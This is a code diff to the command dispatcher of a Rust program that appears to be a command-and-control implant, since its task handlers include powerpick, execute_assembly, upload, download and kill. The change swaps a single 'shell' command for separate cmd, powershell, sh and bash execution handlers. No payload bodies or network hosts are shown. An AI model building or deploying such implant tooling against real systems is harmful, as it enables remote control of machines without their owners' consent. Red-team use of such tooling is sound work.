@@ -24,6 +24,8 @@ mod mv;
 mod netstat;
 #[path = "commands/powerpick.rs"]
 mod powerpick;
+#[path = "commands/process.rs"]
+mod process;
 #[path = "commands/ps.rs"]
 mod ps;
 #[path = "commands/pwd.rs"]
@@ -32,8 +34,6 @@ mod pwd;
 mod resolve;
 #[path = "commands/rm.rs"]
 mod rm;
-#[path = "commands/shell.rs"]
-mod shell;
 #[path = "commands/sleep.rs"]
 mod sleep;
 #[path = "commands/sysinfo.rs"]
@@ -55,6 +55,7 @@ pub fn dispatch(task: &TaskMessage) -> TaskResponse {
         "cp" => cp::handle(task),
         "download" => download::handle(task),
         "env" => env::handle(task),
+        "execute" => process::handle_execute(task),
         "execute_assembly" | "executeAssembly" => execute_assembly::handle(task),
         "exit" => exit::handle(task),
         "kill" => kill::handle(task),
@@ -67,7 +68,10 @@ pub fn dispatch(task: &TaskMessage) -> TaskResponse {
         "pwd" => pwd::handle(task),
         "resolve" => resolve::handle(task),
         "rm" => rm::handle(task),
-        "shell" => shell::handle(task),
+        "cmd" => process::handle_shell(task, process::ShellKind::Cmd),
+        "powershell" => process::handle_shell(task, process::ShellKind::PowerShell),
+        "sh" => process::handle_shell(task, process::ShellKind::Sh),
+        "bash" => process::handle_shell(task, process::ShellKind::Bash),
         "sleep" => sleep::handle(task),
         "sysinfo" => sysinfo::handle(task),
         "upload" => upload::handle(task),
